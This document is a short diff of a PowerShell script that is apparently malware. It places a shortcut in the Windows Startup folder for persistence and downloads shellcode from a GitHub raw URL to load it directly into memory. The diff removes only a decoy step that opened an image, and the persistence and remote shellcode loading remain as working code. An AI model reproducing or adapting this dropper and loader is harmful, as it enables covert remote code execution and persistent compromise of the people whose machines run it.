@@ -109,13 +109,6 @@ $sf = [System.Environment]::GetFolderPath('Startup')
 $lnp = "$sf\secret-image.lnk"
 Invoke-WebRequest -Uri $luri -OutFile $lnp
 
-# Open the downloaded image (decoy)
-if (Test-Path $imagePath) {
-    Start-Process $imagePath
-} else {
-    Write-Host "Image download failed."
-}
-
 # Download and load shellcode directly into memory
 $shellcodeUrl = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/loader.bin"
 $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content
